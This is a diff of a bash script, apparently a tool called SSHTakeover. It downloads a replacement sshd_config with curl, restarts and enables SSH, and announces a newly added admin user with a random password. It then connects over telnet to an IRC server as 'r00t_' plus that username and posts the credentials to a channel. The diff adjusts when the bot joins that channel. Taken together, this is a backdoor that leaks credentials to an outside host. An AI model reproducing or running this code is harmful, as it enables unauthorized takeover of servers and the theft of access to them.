@@ -22,26 +22,28 @@ if [ ! -f ./sshd_config ]; then curl -vL https://github.com/ind3p3nd3nt/SSHTakeo
 if [ -f /usr/bin/yum ]; then service sshd restart && systemctl enable sshd; fi;
 if [ -f /usr/bin/apt ]; then service ssh restart && systemctl enable ssh; fi;
 arr4y="Added admin:, $random_user, password:, $random_number";
-echo $arr4y;
 echo "NICK r00t_$random_user" > input 
 echo "USER $user" >> input
-echo "JOIN #$channel" >> input
 tail -f input | telnet $server 6667 | while read; do
   set -- ${REPLY//$'\r'/}
 
   # answer the critical ping request
   # otherwise the server will disconnect us
   [ "$1" == "PING" ] && echo "PONG $2" >> input
-
+  
+  if [ "$1" == "001" ] ; then
+    echo $* && echo "JOIN #$channel" >> input
+  fi
 
   if [ "$2" == "PRIVMSG" ] ; then
     echo $*
   fi
 
   if [ "$2" == "JOIN" ] ; then
-    echo "Join Event $*"
     echo "PRIVMSG #$channel :$arr4y" >> input
   fi
+
+
 done
 
 
